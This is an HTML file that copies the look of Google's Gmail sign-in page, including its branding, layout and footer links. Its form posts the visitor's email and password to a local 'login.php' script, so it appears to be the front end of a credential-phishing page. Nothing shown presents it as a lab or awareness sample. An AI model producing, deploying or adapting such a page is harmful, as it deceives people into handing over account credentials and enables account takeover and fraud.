<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Sign in</title>
    <style>
        body {
            background-color: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            font-family: 'Roboto', Arial, sans-serif;
        }
        .container {
            max-width: 448px;
            width: 100%;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.15);
            padding: 48px 40px 36px;
        }
        .gmail-gradient {
            background: linear-gradient(135deg, #4285F4 0%, #34A853 33%, #FBBC05 66%, #EA4335 100%);
            width: 64px;
            height: 64px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 16px;
        }
        .header {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 32px;
        }
        .header h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin: 0;
        }
        .header p {
            color: #5f6368;
            margin-top: 4px;
        }
        .form-group {
            margin-bottom: 24px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
        }
        input:focus {
            box-shadow: 0 0 0 2px #1a73e8;
            border-color: transparent;
        }
        .password-wrapper {
            position: relative;
        }
        .password-toggle {
            position: absolute;
            right: 12px;
            top: 12px;
            cursor: pointer;
            color: #5f6368;
        }
        .password-toggle:hover {
            color: #202124;
        }
        .form-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .forgot-link {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }
        .forgot-link:hover {
            color: #174ea6;
        }
        .submit-btn {
            background-color: #1a73e8;
            color: white;
            padding: 8px 24px;
            border-radius: 4px;
            font-weight: 500;
            border: none;
            cursor: pointer;
            font-size: 14px;
        }
        .submit-btn:hover {
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
            background-color: #1765cc;
        }
        .footer {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #dadce0;
        }
        .footer p {
            color: #5f6368;
            font-size: 14px;
            margin: 0;
        }
        .footer a {
            color: #1a73e8;
            text-decoration: none;
        }
        .footer a:hover {
            color: #174ea6;
        }
        .footer-links {
            display: flex;
            justify-content: space-between;
            margin-top: 24px;
        }
        .footer-links a {
            font-size: 14px;
        }
        .create-link {
            color: #1a73e8;
            font-weight: 500;
        }
        .language-link {
            color: #5f6368;
        }
        .language-link:hover {
            color: #202124;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="gmail-gradient">
                <img src="gmail.png" alt="Gmail Logo" width="32" height="32">
            </div>
<h1>Sign in</h1>
            <p>to continue to Gmail</p>
</div>
        <form action="login.php" method="POST">
            <div class="form-group">
                <input type="email" name="email" id="email" required placeholder="Email or phone">
            </div>
            
            <div class="form-group">
                <div class="password-wrapper">
                    <input type="password" name="password" id="password" required placeholder="Password">
                    <div class="password-toggle">
                        <i data-feather="eye"></i>
                    </div>
                </div>
            </div>

            <div class="form-footer">
                <a href="#" class="forgot-link">Forgot password?</a>
                <button type="submit" class="submit-btn">Next</button>
            </div>
</form>
        <div class="footer">
            <p>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
            <div class="footer-links">
                <a href="#" class="create-link">Create account</a>
                <a href="#" class="language-link">English (United States)</a>
            </div>
</div>
    </div>
    <script>
        // Load feather icons
        document.addEventListener('DOMContentLoaded', function() {
            feather.replace();
            
            // Toggle password visibility
            document.querySelector('[data-feather="eye"]').addEventListener('click', function() {
const password = document.getElementById('password');
            const icon = this;
            if (password.type === 'password') {
                password.type = 'text';
                icon.setAttribute('data-feather', 'eye-off');
            } else {
                password.type = 'password';
                icon.setAttribute('data-feather', 'eye');
            }
            feather.replace();
            });
        });
    </script>
    <script src="feather.min.js"></script>
</body>
</html>
